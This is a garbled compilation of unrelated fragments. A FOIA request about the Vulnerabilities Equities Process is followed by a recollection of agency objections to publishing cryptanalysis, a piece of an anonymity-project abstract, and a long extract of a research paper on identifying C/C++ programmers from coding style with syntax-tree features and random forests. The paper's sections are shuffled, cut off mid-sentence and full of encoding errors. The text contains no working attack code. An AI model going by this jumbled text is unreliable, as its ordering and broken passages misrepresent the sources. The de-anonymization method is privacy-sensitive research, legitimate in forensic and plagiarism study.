appreciate the service of FOIA professionals such as those involved in
this request, who provide tireless effort the all hundreds of millions
of US citizens, my personal cost should be recognized. For this reason
a deference in favor of public interest and disclosure is well
supported for this request regarding the "Vulnerabilities Equities
Process", which is a public outreach activity communicating with third
party partners, acting in the public interest, regarding software used
by public citizens and business alike.
Thank you for your time, and best regards,

should not be published. It was true that there were some who thought
that crypto methodology should be "born classified" as some atomic
energy research is, but it was not. (Bills to this effect were later
proposed in Congress but never passed).
Furthermore, the RG said, there were many in the agency who thought
that publishing such papers was inevitable and harmless; he himself
held this view. There were also some who believed that this kind of
publication might cause them real problems. He recalled the good old
days when public and academic interest in cryptography was confined to
newspaper puzzles. He got a bit more specific about two things: the
agency didn't particularly care about the M-209. What they did care
about was that the method that Reeds had discovered was applicable to
systems that were in current use by particular governments, and that
even though it was hard to imagine that these people would find the
paper and relate it to their own operations (which used
commercially-available crypto machines), still... perhaps we should
exercise discretion? It was certainly legal to publish, but
publication might cause difficulties for some people in the agency.

We believe the vulnerabilities and measurability limitations of onion

of goals and to defend an ultimately indefensible position.
Current tools offer a general-purpose, unconstrained, and individualistic
form of  anonymous  Internet  access.   However,  there are many ways
for unconstrained, individualistic uses of the Internet to be
fingerprinted and tied to individual users.  We suspect that the only
way to achieve measurable and provable levels of anonymity, and to
stake out a position defensible in the long term, is to develop more
collective anonymity protocols and tools.
It may be necessary to constrain the normally individualistic
behaviors of participating nodes, the expectations of users, and
possibly the set of applications
and usage models to which these protocols and tools apply.
Toward this end, we offer a high-level view of the Dissent project, a
“clean-slate” effort to build practical anonymity systems embodying a
collective model for anonymous  communication.

anonymous code contributors. However,
it may also enable attribution of successful attacks from
code left behind on an infected system, or aid in resolving copyright,
copyleft, and plagiarism issues in the programming fields. In this
work, we investigate machine
learning methods to de-anonymize source code authors
of C/C++ using coding style. Our Code Stylometry Feature Set is a
novel representation of coding style found
in source code that reflects coding style from properties
derived from abstract syntax trees.
Our random forest and abstract syntax tree-based approach attributes
more authors (1,600 and 250) with significantly higher accuracy (94%
and 98%) on a larger
data set (Google Code Jam) than has been previously
achieved. Furthermore, these novel features are robust,
difficult to obfuscate, and can be used in other programming
languages, such as Python. We also find that (i) the
code resulting from difficult programming tasks is easier
to attribute than easier tasks and (ii) skilled programmers
(who can complete the more difficult tasks) are easier to
attribute than less skilled programmers.
Do programmers leave fingerprints in their source code?
That is, does each programmer have a distinctive â€œcoding styleâ€?
Perhaps a programmer has a preference for
spaces over tabs, or while loops over for loops, or,
more subtly, modular rather than monolithic code.
These questions have strong privacy and security implications.
Contributors to open-source projects may
hide their identity whether they are Bitcoinâ€™s creator or
just a programmer who does not want her employer to
know about her side activities. They may live in a regime
that prohibits certain types of software, such as censorship
circumvention tools. For example, an Iranian pro-
grammer was sentenced to death in 2012 for developing
photo sharing software that was used on pornographic
websites [31].
The flip side of this scenario is that code attribution
may be helpful in a forensic context, such as detection of
ghostwriting, a form of plagiarism, and investigation of
copyright disputes. It might also give us clues about the
identity of malware authors. A careful adversary may
only leave binaries, but others may leave behind code
written in a scripting language or source code downloaded into the
breached system for compilation.
While this problem has been studied previously, our
work represents a qualitative advance over the state of the
art by showing that Abstract Syntax Trees (ASTs) carry
authorial â€˜fingerprints.â€™ The highest accuracy achieved
in the literature is 97%, but this is achieved on a set of
only 30 programmers and furthermore relies on using
programmer comments and larger amounts of training
data [12, 14]. We match this accuracy on small programmer sets without
this limitation. The largest scale experiments in the literature use
46 programmers and achieve
67.2% accuracy [10]. We are able to handle orders of
magnitude more programmers (1,600) while using less
training data with 92.83% accuracy. Furthermore, the
features we are using are not trivial to obfuscate. We are
able to maintain high accuracy while using commercial
obfuscators. While abstract syntax trees can be obfuscated to an
extent, doing so incurs significant overhead
and maintenance costs.
Contributions. First, we use syntactic features for
code stylometry. Extracting such features requires parsing of
incomplete source code using a fuzzy parser to
generate an abstract syntax tree. These features add a
component to code stylometry that has so far remained
almost completely unexplored. We provide evidence that
these features are more fundamental and harder to obfuscate. Our
complete feature set consists of a comprehensive set of around 120,000
layout-based, lexical, and
syntactic features. With this complete feature set we are
able to achieve a significant increase in accuracy compared to
previous work. Second, we show that we can
scale our method to 1,600 programmers without losing
much accuracy. Third, this method is not specific to C or
C++, and can be applied to any programming language.
We collected C++ source of thousands of contestants
from the annual international competition â€œGoogle Code
Jamâ€. A bagging (portmanteau of â€œbootstrap aggregatingâ€)
classifier - random forest was used to attribute programmers to source
code. Our classifiers reach 98% accuracy in a 250-class closed world
task, 93% accuracy in
a 1,600-class closed world task, 100% accuracy on average in a
two-class task. Finally, we analyze various
attributes of programmers, types of programming tasks,
and types of features that appear to influence the success
of attribution. We identified the most important 928 features out of
120,000; 44% of them are syntactic, 1% are
layout-based and the rest of the features are lexical. 8
training files with an average of 70 lines of code is sufficient for
training when using the lexical, layout and syntactic features. We
also observe that programmers with
a greater skill set are more easily identifiable compared
to less advanced programmers and that a programmerâ€™s
coding style is more distinctive in implementations of
difficult tasks as opposed to easier tasks.
The remainder of this paper is structured as follows.
We begin by introducing applications of source code authorship
attribution considered throughout this paper in
Section 2, and present our AST-based approach in Section 3. We proceed
to give a detailed overview of the experiments conducted to evaluate
our method in Section 4
and discuss the insights they provide in Section 5. Section 6 presents
related work, and Section 7 concludes.
Jam competition, as we discuss in Section 4.1. Doubtless there will be
additional challenges in using our techniques for digital forensics or
any of the other real-world
applications. We describe some known limitations in
Section 5.
Programmer De-anonymization. In this scenario,
the analyst is interested in determining the identity of an
anonymous programmer. For example, if she has a set of
programmers who she suspects might be Bitcoinâ€™s creator, Satoshi,
and samples of source code from each of
these programmers, she could use the initial versions of
Bitcoinâ€™s source code to try to determine Satoshiâ€™s identity. Of
course, this assumes that Satoshi did not make
any attempts to obfuscate his or her coding style. Given a
set of probable programmers, this is considered a closedworld machine
learning task with multiple classes where
anonymous source code is attributed to a programmer.
This is a threat to privacy for open source contributors
who wish to remain anonymous.
Ghostwriting Detection. Ghostwriting detection is
related to but different from traditional plagiarism detection. We are
given a suspicious piece of code and one or
more candidate pieces of code that the suspicious code
may have been plagiarized from. This is a well-studied
problem, typically solved using code similarity metrics,
as implemented by widely used tools such as MOSS [6],
JPlag [25], and Sherlock [24].
For example, a professor may want to determine
whether a studentâ€™s programming assignment has been
written by a student who has previously taken the class.
Unfortunately, even though submissions of the previous
year are available, the assignments may have changed
considerably, rendering code-similarity based methods
ineffective. Luckily, stylometry can be applied in this
settingâ€”we find the most stylistically similar piece of
code from the previous yearâ€™s corpus and bring both students in for
gentle questioning. Given the limited set of
students, this can be considered a closed-world machine
learning problem.
Software Forensics. In software forensics, the analyst
assembles a set of candidate programmers based on previously collected
malware samples or online code repositories. Unfortunately, she cannot
be sure that the anonymous programmer is one of the candidates, making
an open world classification problem as the test sample
might not belong to any known category.
Copyright Investigation. Theft of code often leads to
copyright disputes. Informal arrangements of hired programming labor
are very common, and in the absence of
a written contract, someone might claim a piece of code
was her own after it was developed for hire and delivered.
A dispute between two parties is thus a two-class classification
problem; we assume that labeled code from both
programmers is available to the forensic expert.
Throughout this work, we consider an analyst interested
in determining the programmer of an anonymous fragment of source code
purely based on its style. To do so,
the analyst only has access to labeled samples from a set
of candidate programmers, as well as from zero or more
unrelated programmers.
The analyst addresses this problem by converting each
labeled sample into a numerical feature vector, in order to
train a machine learning classifier, that can subsequently
be used to determine the codeâ€™s programmer. In particular, this
abstract problem formulation captures the following five settings and
corresponding applications (see
Table 1). The experimental formulations are presented in
Section 4.2.
We emphasize that while these applications motivate
our work, we have not directly studied them. Rather, we
formulate them as variants of a machine-learning (classification)
problem. Our data comes from the Google Code
Authorship Verification. Finally, we may suspect
that a piece of code was not written by the claimed programmer, but
have no leads on who the actual programmer might be. This is the
authorship verification problem. In this work, we take the textbook
approach and
model it as a two-class problem where positive examples
come from previous works of the claimed programmer
and negative examples come from randomly selected unrelated
programmers. Alternatively, anomaly detection
could be employed in this setting, e.g., using a one-class
support vector machine [see 30].
As an example, a recent investigation conducted by
Verizon [17] on a US companyâ€™s anomalous virtual private network
traffic, revealed an employee who was outsourcing her work to
programmers in China. In such
cases, training a classifier on employeeâ€™s original code
and that of random programmers, and subsequently testing pieces of
recent code, could demonstrate if the employee was the actual
In each of these applications, the adversary may try to
actively modify the programâ€™s coding style. In the software
forensics application, the adversary tries to modify
code written by her to hide her style. In the copyright and
authorship verification applications, the adversary modifies code
written by another programmer to match his
own style. Finally, in the ghostwriting application, two
of the parties may collaborate to modify the style of code
written by one to match the otherâ€™s style.

different features to represent both syntax and structure
of program code (Section 3.2) and finally, we train a random forest
classifier for classification of previously unseen source files
(Section 3.3). In the following sections,
we will discuss each of these steps in detail and outline
design decisions along the way. The code for our approach is made
available as open-source to allow other
researchers to reproduce our results1 .
To date, methods for source code authorship attribution focus mostly
on sequential feature representations of
code such as byte-level and feature level n-grams [8, 13].
While these models are well suited to capture naming
conventions and preference of keywords, they are entirely language
agnostic and thus cannot model author
characteristics that become apparent only in the composition of
language constructs. For example, an authorâ€™s
tendency to create deeply nested code, unusually long
functions or long chains of assignments cannot be modeled using n-grams alone.
Addressing these limitations requires source code to
be parsed. Unfortunately, parsing C/C++ code using traditional
compiler front-ends is only possible for complete
code, i.e., source code where all identifiers can be resolved. This
severely limits their applicability in the setting of authorship
attribution as it prohibits analysis of
lone functions or code fragments, as is possible with simple n-gram models.
As a compromise, we employ the fuzzy parser Joern that has been
designed specifically with incomplete
code in mind [32]. Where possible, the parser produces
abstract syntax trees for code fragments while ignoring
fragments that cannot be parsed without further information. The
produced syntax trees form the basis for
our feature extraction procedure. While they largely preserve the
information required to create n-grams or bagof-words representations,
in addition, they allow a wealth
of features to be extracted that encode programmer habits
visible in the codeâ€™s structure.
As an example, consider the function foo as shown
in Figure 1, and a simplified version of its corresponding abstract
syntax tree in Figure 2. The function contains a number of common
language constructs found
in many programming languages, such as if-statements
(line 3 and 7), return-statements (line 4, 8 and 10), and
function call expressions (line 6). For each of these constructs, the
abstract syntax tree contains a corresponding
node. While the leaves of the tree make classical syntactic features
such as keywords, identifiers and operators accessible, inner nodes
represent operations showing

Table 1: Overview of Applications for Code Stylometry
We emphasize that code stylometry that is robust to
adversarial manipulation is largely left to future work.
However, we hope that our demonstration of the power
of features based on the abstract syntax tree will serve as
the starting point for such research.
Fuzzy Abstract Syntax Trees
De-anonymizing Programmers
One of the goals of our research is to create a classifier
that automatically determines the most likely author of
a source file. Machine learning methods are an obvious
choice to tackle this problem, however, their success crucially
depends on the choice of a feature set that clearly
represents programming style. To this end, we begin by
parsing source code, thereby obtaining access to a wide
range of possible features that reflect programming language use
(Section 3.1). We then define a number of

Feature Extraction
Analyzing coding style using machine learning approaches is not
possible without a suitable representation of source code that clearly
expresses program style.
To address this problem, we present the Code Stylometry Feature Set
(CSFS), a novel representation of source
code developed specifically for code stylometry. Our feature set
combines three types of features, namely lexical
features, layout features and syntactic features. Lexical
and layout features are obtained from source code while
the syntactic features can only be obtained from ASTs.
We now describe each of these feature types in detail.
Figure 2: Corresponding Abstract Syntax Tree
how these basic elements are combined to form expressions and
statements. In effect, the nesting of language
constructs can also be analyzed to obtain a feature set
representing the codeâ€™s structure.
Lexical and Layout Features
We begin by extracting numerical features from the
source code that express preferences for certain identifiers and
keywords, as well as some statistics on the use
of functions or the nesting depth. Lexical and layout features can be
calculated from the source code, without
having access to a parser, with basic knowledge of the
programming language in use. For example, we measure the number of
functions per source line to determine
the programmerâ€™s preference of longer over shorter functions.
Furthermore, we tokenize the source file to obtain
the number of occurrences of each token, so called word
unigrams. Table 2 gives an overview of lexical features.
In addition, we consider layout features that represent
code-indentation. For example, we determine whether
the majority of indented lines begin with whitespace
or tabulator characters, and we determine the ratio of
whitespace to the file size. Table 3 gives a detailed description of
these features.
*About 55,000 for 250 authors with 9 files.
Table 2: Lexical Features
Syntactic Features
The syntactic feature set describes the properties of the
language dependent abstract syntax tree, and keywords.
Calculating these features requires access to an abstract
syntax tree. All of these features are invariant to changes
in source-code layout, as well as comments.
Table 4 gives an overview of our syntactic features.
We obtain these features by preprocessing all C++ source
files in the dataset to produce their abstract syntax trees.

particular type of node. The inverse document frequency
is calculated by dividing the number of authors in the
dataset by the number of authors that use that particular
node. Consequently, we are able to capture how rare of a
node it is and weight it more according to its rarity.
The maximum depth of an abstract syntax tree reflects the deepest
level a programmer nests a node in the
solution. The average depth of the AST nodes shows
how nested or deep a programmer tends to use particular
structural pieces. And lastly, term frequency of each C++
keyword is calculated. Each of these features is written
to a feature vector to represent the solution file of a specific
author and these vectors are later used in training
and testing by machine learning classifiers.
Table 3: Layout Features
Using the feature set presented in the previous section,
we can now express fragments of source code as numerical vectors,
making them accessible to machine learning
algorithms. We proceed to perform feature selection and
train a random forest classifier capable of identifying the
most likely author of a code fragment.
An abstract syntax tree is created for each function in the
code. There are 58 node types in the abstract syntax tree
(see Appendix A) produced by Joern [33].

Due to our heavy use of unigram term frequency and
TF/IDF measures, and the diversity of individual terms
in the code, our resulting feature vectors are extremely
large and sparse, consisting of tens of thousands of features for
hundreds of classes. The dynamic Code stylometry feature set, for
example, produced close to 120,000
features for 250 authors with 9 solution files each.
In many cases, such feature vectors can lead to overfitting (where a
rare term, by chance, uniquely identifies
a particular author). Extremely sparse feature vectors
can also damage the accuracy of random forest classifiers, as the
sparsity may result in large numbers of zerovalued features being
selected during the random subsampling of the features to select a
best split. This reduces the number of â€˜usefulâ€™ splits that can be
at any given node, leading to poorer fits and larger trees.
Large, sparse feature vectors can also lead to slowdowns
in model fitting and evaluation, and are often more difficult to
interpret. By selecting a smaller number of more
informative features, the sparsity in the feature vector can
be greatly reduced, thus allowing the classifier to both
produce more accurate results and fit the data faster.
We therefore employed a feature selection step using
WEKAâ€™s information gain [26] criterion, which evaluates
the difference between the entropy of the distribution of
classes and the entropy of the conditional distribution of
classes given a particular feature:
*About 45,000 for 250 authors with 9 files.
**About 7,000 for 250 authors with 9 files.
**About 4,000 for 150 authors with 6 files.
**About 2,000 for 25 authors with 9 files.
Table 4: Syntactic Features
The AST node bigrams are the most discriminating
features of all. AST node bigrams are two AST nodes
that are connected to each other. In most cases, when
used alone, they provide similar classification results to
using the entire feature set.
The term frequency (TF) is the raw frequency of a
node found in the abstract syntax trees for each file. The
term frequency inverse document frequency (TFIDF) of
nodes is calculated by multiplying the term frequency of
a node by inverse document frequency. The goal in using
the inverse document frequency is normalizing the term
frequency by the number of authors actually using that
Feature Selection
IG(A, Mi ) = H(A) âˆ’ H(A|Mi )
where A is the class corresponding to an author, H is
Shannon entropy, and Mi is the ith feature of the dataset.
Intuitively, the information gain can be thought of as
measuring the amount of information that the observation of the value
of feature i gives about the class label
associated with the example.
To reduce the total size and sparsity of the feature vector, we
retained only those features that individually had
non-zero information gain. (These features can be referred to as
IG-CSFS throughout the rest of the paper.)
Note that, as H(A|Mi ) â‰¤ H(A), information gain is always
non-negative. While the use of information gain
on a variable-per-variable basis implicitly assumes independence
between the features with respect to their impact on the class label,
this conservative approach to feature selection means that we only use
features that have
demonstrable value in classification.
To validate this approach to feature selection, we applied this method
to two distinct sets of source code files,
and observed that sets of features with non-zero information gain were
nearly identical between the two sets, and
the ranking of features was substantially similar between
the two. This suggests that the application of information
gain to feature selection is producing a robust and consistent set of
features (see Section 4 for further discussion). All the results are
calculated by using CSFS and
IG-CSFS. Using IG-CSFS on all experiments demonstrates how these
features generalize to different datasets
that are larger in magnitude. One other advantage of IGCSFS is that it
consists of a few hundred features that
result in non-sparse feature vectors. Such a compact representation of
coding style makes de-anonymizing thousands of programmers possible in
of features can be found using the out of bag (oob) error
estimate, or the error estimate derived from those samples not
selected for training on a given tree.
During classification, each test example is classified
via each of the trained decision trees by following the binary
decisions made at each node until a leaf is reached,
and the results are then aggregated. The most populous
class can be selected as the output of the forest for simple
classification, or classifications can be ranked according
to the number of trees that â€˜votedâ€™ for a label when performing
relaxed attribution (see Section 4.3.4).
We employed random forests with 300 trees, which
empirically provided the best trade-off between accuracy
and processing time. Examination of numerous oob values across
multiple fits suggested that (logM) + 1 random features (where M
denotes the total number of features) at each split of the decision
trees was in fact optimal in all of the experiments (listed in Section
4), and
was used throughout. Node splits were selected based on
the information gain criteria, and all trees were grown to
the largest extent possible, without pruning.
The data was analyzed via k-fold cross-validation,
where the data was split into training and test sets stratified by
author (ensuring that the number of code samples per author in the
training and test sets was identical across authors). k varies
according to datasets and
is equal to the number of instances present from each
author. The cross-validation procedure was repeated 10
times, each with a different random seed. We report the
average results across all iterations in the results, ensuring that
they are not biased by improbably easy or difficult to classify
Random Forest Classification
We used the random forest ensemble classifier [7] as
our classifier for authorship attribution. Random forests
are ensemble learners built from collections of decision
trees, each of which is grown by randomly sampling
N training samples with replacement, where N is the
number of instances in the dataset. To reduce correlation between
trees, features are also subsampled; commonly (logM) + 1 features are
selected at random (without replacement) out of M, and the best split
on these
(logM) + 1 features is used to split the tree nodes. The
number of selected features represents one of the few
tuning parameters in random forests: increasing the number of features
increases the correlation between trees in
the forest which can harm the accuracy of the overall ensemble,
however increasing the number of features that
can be chosen at each split increases the classification accuracy of
each individual tree making them stronger classifiers with low error
rates. The optimal range of number
In the evaluation section, we present the results to the
possible scenarios formulated in the problem statement
and evaluate our method. The corpus section gives an
overview of the data we collected. Then, we present the
main results to programmer de-anonymization and how
it scales to 1,600 programmers, which is an immediate
privacy concern for open source contributors that prefer
to remain anonymous. We then present the training data
requirements and efficacy of types of features. The obfuscation
section discusses a possible countermeasure to
programmer de-anonymization. We then present possible machine learning
formulations along with the verification section that extends the
approach to an open world
problem. We conclude the evaluation with generalizing
the method to other programming languages and providing software
engineering insights.
4.1
(ii) Within each year, we ordered the corpus files by the
round in which they were written, and by the problem
within a round, as all competitors proceed through the
same sequence of rounds in that year. As a result, we
performed stratified cross validation on each program file
by the year it was written, by the round in which the program was
written, by the problems solved in the round,
and by the authorâ€™s highest round completed in that year.
Some limitations of this dataset are that it does not allow us to
assess the effect of style guidelines that may
be imposed on a project or attributing code with multiple/mixed
programmers. We leave these interesting
questions for future work, but posit that our improved results with
basic stylometry make them worthy of study.
One concern in source code authorship attribution is that
we are actually identifying differences in coding style,
rather than merely differences in functionality. Consider
the case where Alice and Bob collaborate on an open
source project. Bob writes user interface code whereas
Alice works on the network interface and backend analytics. If we used
a dataset derived from their project,
we might differentiate differences between frontend and
backend code rather than differences in style.
In order to minimize these effects, we evaluate our
method on the source code of solutions to programming
tasks from the international programming competition
Google Code Jam (GCJ), made public in 2008 [2]. The
competition consists of algorithmic problems that need
to be solved in a programming language of choice. In
particular, this means that all programmers solve the
same problems, and hence implement similar functionality, a property
of the dataset crucial for code stylometry
The dataset contains solutions by professional programmers, students,
academics, and hobbyists from 166
countries. Participation statistics are similar over the
years. Moreover, it contains problems of different difficulty, as the
contest takes place in several rounds. This
allows us to assess whether coding style is related to programmer
experience and problem difficulty.
The most commonly used programming language was
C++, followed by Java, and Python. We chose to investigate source code
stylometry on C++ and C because of
their popularity in the competition and having a parser
for C/C++ readily available [32]. We also conducted
some preliminary experimentation on Python.
A validation dataset was created from 2012â€™s GCJ
competition. Some problems had two stages, where the
second stage involved answering the same problem in a
limited amount of time and for a larger input. The solution to the
large input is essentially a solution for the
small input but not vice versa. Therefore, collecting both
of these solutions could result in duplicate and identical
source code. In order to avoid multiple entries, we only
collected the small input versionsâ€™ solutions to be used in
our dataset.
The programmers had up to 19 solution files in these
datasets. Solution files have an average of 70 lines of
code per programmer.
To create our experimental datasets that are discussed
in further detail in the results section;
(i) We first partitioned the corpus of files by year of competition.
The â€œmainâ€ dataset includes files drawn from
2014 (250 programmers). The â€œvalidationâ€ dataset files
come from 2012, and the â€œmulti-yearâ€ dataset files come
from years 2008 through 2014 (1,600 programmers).
In this section, we will go over machine learning task
formulations representing five possible real-world applications
presented in Section 2.
Multiclass Closed World Task
This section presents our main experimentâ€”deanonymizing 250
programmers in the difficult scenario
where all programmers solved the same set of problems. The machine
learning task formulation for
de-anonymizing programmers also applies to ghostwriting detection. The
biggest dataset formed from 2014â€™s
Google Code Jam Competition with 9 solution files to
the same problem had 250 programmers. These were the
easiest set of 9 problems, making the classification more
challenging (see Section 4.3.6). We reached 91.78%
accuracy in classifying 250 programmers with the Code
Stylometry Feature Set. After applying information gain
and using the features that had information gain, the
accuracy was 95.08%.
We also took 250 programmers from different years
and randomly selected 9 solution files for each one of
them. We used the information gain features obtained
from 2014â€™s dataset to see how well they generalize.
We reached 98.04% accuracy in classifying 250 programmers. This is 3%
higher than the controlled large
datasetâ€™s results. The accuracy might be increasing because of using
a mixed set of Google Code Jam problems, which potentially contains
the possible solutionsâ€™
properties along with programmersâ€™ coding style and
makes the code more distinct.
We wanted to evaluate our approach and validate our
method and important features. We created a dataset
from 2012â€™s Google Code Jam Competition with 250
programmers who had the solutions to the same set of
9 problems. We extracted only the features that had positive
information gain in 2014â€™s dataset that was used as

There was one correct classification made with 13.7%
confidence. This suggests that we can use a threshold between 13.7%
and 15% confidence level for verification,
and manually analyze the classifications that did not pass
the confidence threshold or exclude them from results.
We picked an aggressive threshold of 15% and to validate it, we
trained a random forest classifier on the same
set of 30 programmers 270 code samples. We tested on
150 different files from the programmers in the training
set. There were 6 classifications below the 15% threshold
and two of them were misclassified. We took another set
of 420 test files from 30 programmers that were not in the
training set. All the files from the 30 programmers were
attributed to one of the 30 programmers in the training
set since this is a closed world classification task, however, the
highest confidence level in these classifications
was 14.7%. The 15% threshold catches all the instances
that do not belong to the programmers in the suspect set,
gets rid of 2 misclassifications and 4 correct classifications.
Consequently, when we see a classification with
less than a threshold value, we can reject the classification and
attribute the test instance to an unknown suspect.

accuracy was 96.83%, which is higher than the
95.07% accuracy obtained in 2014â€™s dataset.
The high accuracy of validation results in Table 5 show
that we identified the important features of code stylometry and found
a stable feature set. This feature set does
not necessarily represent the exact features for all possible
datasets. For a given dataset that has ground truth
information on authorship, following the same approach
should generate the most important features that represent coding
style in that particular dataset.

Mutliclass Open World Task
The experiments in this section can be used in software
forensics to find out the programmer of a piece of malware. In
software forensics, the analyst does not know if
source code belongs to one of the programmers in the
candidate set of programmers. In such cases, we can
classify the anonymous source code, and if the majority
number of votes of trees in the random forest is below a
certain threshold, we can reject the classification considering the
possibility that it might not belong to any of the
classes in the training data. By doing so, we can scale
our approach to an open world scenario, where we might
not have encountered the suspect before. As long as we
determine a confidence threshold based on training data
[30], we can calculate the probability that an instance
belongs to one of the programmers in the set and accordingly accept or
reject the classification.
We performed 270 classifications in a 30-class problem using all the
features to determine the confidence
threshold based on the training data. The accuracy was
96.67%. There were 9 misclassifications and all of them
were classified with less than 15% confidence by the
classifier. The class probability or classification confidence that
source code fragment C is of class i is calculated by taking the
percentage of trees in the random
forest that voted for that particular class, as follows2:

Two-class Closed World Task
Source code author identification could automatically
deal with source code copyright disputes without requiring manual
analysis by an objective code investigator.
A copyright dispute on code ownership can be resolved
by comparing the styles of both parties claiming to have
generated the code. The style of the disputed code can
be compared to both partiesâ€™ other source code to aid in
the investigation. To imitate such a scenario, we took
60 different pairs of programmers, each with 9 solution
files. We used a random forest and 9-fold cross validation
to classify two programmersâ€™ source code. The average
classification accuracy using CSFS set is 100.00% and
100.00% with the information gain features.
Two-class/One-class Open World Task
Another two-class machine learning task can be formulated for
authorship verification. We suspect Mallory of
plagiarizing, so we mix in some code of hers with a large
sample of other people, test, and see if the disputed code
gets classified as hers or someone elseâ€™s. If it gets classified as
hers, then it was with high probability really
written by her. If it is classified as someone elseâ€™s, it
really was someone elseâ€™s code. This could be an open
world problem and the person that originally wrote the
code could be a previously unknown programmer.
This is a two-class problem with classes Mallory and
others. We train on Malloryâ€™s solutions to problems a,
b, c, d, e, f, g, h. We also train on programmer Aâ€™s solution to
problem a, programmer Bâ€™s solution to problem b,
programmer Câ€™s solution to problem c, programmer Dâ€™s
solution to problem d, programmer Eâ€™s solution to problem e,
programmer Fâ€™s solution to problem f, programmer Gâ€™s solution to
problem g, programmer Hâ€™s solution
to problem h and put them in one class called ABCDEFGH. We train a
random forest classifier with 300 trees
on classes Mallory and ABCDEFGH. We have 6 test instances from Mallory
and 6 test instances from another
programmer ZZZZZZ, who is not in the training set.
These experiments have been repeated in the exact same setting with 80
different sets of programmers
ABCDEFGH, ZZZZZZ and Mallorys. The average classification accuracy for
Mallory using the CSFS set is
100.00%. ZZZZZZâ€™s test instances are classified as programmer
ABCDEFGH 82.04% of the time, and classified as Mallory for the rest of
the time while using the
CSFS. Depending on the amount of false positives we
are willing to accept, we can change the operating point
on the ROC curve.
These results are also promising for use in cases where
a piece of code is suspected to be plagiarized. Following
the same approach, if the classification result of the piece
of code is someone other than Mallory, that piece of code
was with very high probability not written by Mallory.

scales. We are able to de-anonymize 1,600 programmers
using 32GB memory within one hour. Alternately, we
can use 40 trees and get nearly the same accuracy (within
0.5%) in a few minutes.
Figure 3: Large Scale De-anonymization
Training Data and Features
We selected different sets of 62 programmers that had F
solution files, from 2 up to 14. Each dataset has the solutions to the
same set of F problems by different sets
of programmers. Each dataset consisted of programmers
that were able to solve exactly F problems. Such an experimental setup
makes it possible to investigate the effect of programmer skill set on
coding style. The size of
the datasets were limited to 62, because there were only
62 contestants with 14 files. There were a few contestants with up to
19 files but we had to exclude them since
there were not enough programmers to compare them.
The same set of F problems were used to ensure that
the coding style of the programmer is being classified
and not the properties of possible solutions of the problem itself. We
were able to capture personal programming style since all the
programmers are coding the same
functionality in their own ways.
Stratified F-fold cross validation was used by training
on everyoneâ€™s (F âˆ’ 1) solutions and testing on the F th
problem that did not appear in the training set. As a result, the
problems in the test files were encountered for
the first time by the classifier.
We used a random forest with 300 trees and (logM)+1
features with F-fold stratified cross validation, first with
the Code Stylometry Feature Set (CSFS) and then with
the CSFSâ€™s features that had information gain.
Figure 4 shows the accuracy from 13 different sets of
62 programmers with 2 to 14 solution files, and consequently 1 to 13
training files. The CSFS reaches an optimal training set size at 9
solution files, where the classifier trains on 8 (F âˆ’ 1) solutions.
In the datasets we constructed, as the number of files
increase and problems from more advanced rounds are
included, the average line of code (LOC) per file also
increases. The average lines of code per source code
in the dataset is 70. Increased number of lines of code
might have a positive effect on the accuracy but at the
same time it reveals programmerâ€™s choice of program
We collected a larger dataset of 1,600 programmers from
various years. Each of the programmers had 9 source
code samples. We created 7 subsets of this large dataset
in differing sizes, with 250, 500, 750, 1,000, 1,250,
1,500, and 1,600 programmers. These subsets are useful to understand
how well our approach scales. We extracted the specific features that
had information gain in
the main 250 programmer dataset from this large dataset.
In theory, we need to use more trees in the random forest as the
number of classes increase to decrease variance, but we used fewer
trees compared to smaller experiments. We used 300 trees in the random
forest to
run the experiments in a reasonable amount of time with
a reasonable amount of memory. The accuracy did not
decrease too much when increasing the number of programmers. This
result shows that information gain features are robust against changes
in class and are important properties of programmersâ€™ coding styles.
following Figure 3 demonstrates how well our method
detectable change in the performance of the classifier for
this sample. The results are summarized in Table 6.
We took the maximum number of programmers, 20,
that had solutions to 9 problems in C and obfuscated
the code (see example in Appendix B) using a much
more sophisticated open source obfuscator called Tigress
[1]. In particular, Tigress implements function virtualization, an
obfuscation technique that turns functions into
interpreters and converts the original program into corresponding
bytecode. After applying function virtualization, we were less able to
effectively de-anonymize
programmers, so it has potential as a countermeasure to
programmer de-anonymization. However, this obfuscation comes at a
cost. First of all, the obfuscated code is
neither readable nor maintainable, and is thus unsuitable
for an open source project. Second, the obfuscation adds
significant overhead (9 times slower) to the runtime of
the program, which is another disadvantage.
The accuracy with the information gain feature set on
the obfuscated dataset is reduced to 67.22%. When we
limit the feature set to AST node bigrams, we get 18.89%
accuracy, which demonstrates the need for all feature
types in certain scenarios. The accuracy on the same
dataset when the code is not obfuscated is 95.91%.

length in implementing the same functionality. On the
other hand, the average line of code of the 7 easier (76
LOC) or difficult problems (83 LOC) taken from contestants that were
able to complete 14 problems, is higher
than the average line of code (68) of contestants that
were able to solve only 7 problems. This shows that
programmers with better skills tend to write longer code
to solve Google Code Jam problems. The mainstream
idea is that better programmers write shorter and cleaner
code which contradicts with line of code statistics in our
datasets. Google Code Jam contestants are supposed to
optimize their code to process large inputs with faster
performance. This implementation strategy might be
leading to advanced programmers implementing longer
solutions for the sake of optimization.
We took the dataset with 62 programmers each with
9 solutions. We get 97.67% accuracy with all the features and 99.28%
accuracy with the information gain features. We excluded all the
syntactic features and the accuracy dropped to 88.89% with all the
non-syntactic features and 88.35% with the information gain features
the non-syntactic feature set. We ran another experiment
using only the syntactic features and obtained 96.06%
with all the syntactic features and 96.96% with the information gain
features of the syntactic feature set. Most
of the classification power is preserved with the syntactic features,
and using non-syntactic features leads to a
significant decline in accuracy.

The goal here is to determine whether it is possible to reduce the
number of suspects using code stylometry. Reducing the set of suspects
in challenging cases, such as
having too many suspects, would reduce the effort required to manually
find the actual programmer of the
In this section, we performed classification on the
main 250 programmer dataset from 2014 using the information gain
features. The classification was relaxed
to a set of top R suspects instead of exact classification
of the programmer. The relaxed factor R varied from 1
to 10. Instead of taking the highest majority vote of the
decisions trees in the random forest, the highest R majority vote
decisions were taken and the classification result
was considered correct if the programmer was in the set
of top R highest voted classes. The accuracy does not
improve much after the relaxed factor is larger than 5.
We took a dataset with 9 solution files and 20 programmers and
obfuscated the code using an off-the-shelf C++
obfuscator called stunnix [3]. The accuracy with the information gain
code stylometry feature set on the obfuscated dataset is 98.89%. The
accuracy on the same
dataset when the code is not obfuscated is 100.00%. The
obfuscator refactored function and variable names, as
well as comments, and stripped all the spaces, preserving the
functionality of code without changing the structure of the program.
Obfuscating the data produced little

lexical features as well as using a fuzzy parser.

Figure 5: Relaxed Classification with 250 Programmers
Table 7: Generalizing to Other Programming Languages
Generalizing the Method
Features derived from ASTs can represent coding styles
in various languages. These features are applicable in
cases when lexical and layout features may be less discriminating due
to formatting standards and reliance on
